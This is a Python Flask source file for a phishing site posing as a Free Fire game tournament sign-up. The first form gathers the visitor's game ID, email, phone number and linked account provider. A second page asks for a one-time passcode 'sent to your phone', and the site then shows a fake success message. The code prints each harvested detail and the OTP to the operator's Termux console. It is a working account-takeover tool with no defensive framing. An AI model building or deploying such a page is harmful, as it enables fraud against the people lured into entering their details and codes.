 from flask import Flask, request, render_template_string

app = Flask(__name__)

# HTML Code with Background and Styling
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            background-image: url('https://raw.githubusercontent.com/northway656-create/myflaskapp/main/22449.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            font-family: sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .form-container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0px 0px 20px rgba(0,0,0,0.5);
            text-align: center;
            width: 90%;
            max-width: 350px;
        }
        input, select {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }
        button {
            background-color: blue;
            color: white;
            border: none;
            padding: 15px;
            width: 100%;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <h2 style="color:black; margin-bottom:20px;">💎 FF TOURNAMENT 💎</h2>
        <form action="/submit" method="post">
            <input type="text" name="uid" placeholder="Free Fire UID" required>
            <input type="email" name="email" placeholder="Email Address" required>
            <input type="text" name="phone" placeholder="Mobile Number" required>
            <select name="account">
                <option value="Google">Google Account</option>
                <option value="Facebook">Facebook Account</option>
                <option value="X (Twitter)">X (Twitter)</option>
                <option value="VK Account">VK Account</option>
            </select>
            <button type="submit">SEND OTP</button>
        </form>
    </div>
</body>
</html>
'''

OTP_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background-image: url('https://raw.githubusercontent.com/northway656-create/myflaskapp/main/22449.jpg'); background-size: cover; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .form-container { background: white; padding: 30px; border-radius: 10px; text-align: center; width: 90%; max-width: 350px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; text-align: center; font-size: 18px; letter-spacing: 5px; }
        button { background-color: blue; color: white; border: none; padding: 15px; width: 100%; border-radius: 5px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="form-container">
        <h3>Verify Identity</h3>
        <p>Enter 6-digit OTP sent to your phone</p>
        <form action="/verify" method="post">
            <input type="hidden" name="all_data" value="{{ data }}">
            <input type="text" name="otp" placeholder="000000" maxlength="6" required>
            <button type="submit">VERIFY & JOIN</button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/submit', methods=['POST'])
def submit():
    data = f"UID: {request.form.get('uid')} | Email: {request.form.get('email')} | Phone: {request.form.get('phone')} | Account: {request.form.get('account')}"
    # This prints in Termux
    print(f"\n[!] Step 1 Data Received:\n{data}\n") 
    return render_template_string(OTP_TEMPLATE, data=data)

@app.route('/verify', methods=['POST'])
def verify():
    final_data = request.form.get('all_data')
    otp = request.form.get('otp')
    # This prints in Termux
    print(f"\n[!!!] OTP RECEIVED: {otp}\n[!] Full User Info: {final_data}\n")
    return "<h1 style='text-align:center; padding-top:50px;'>Registration Successful! Please wait 24 hours.</h1>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
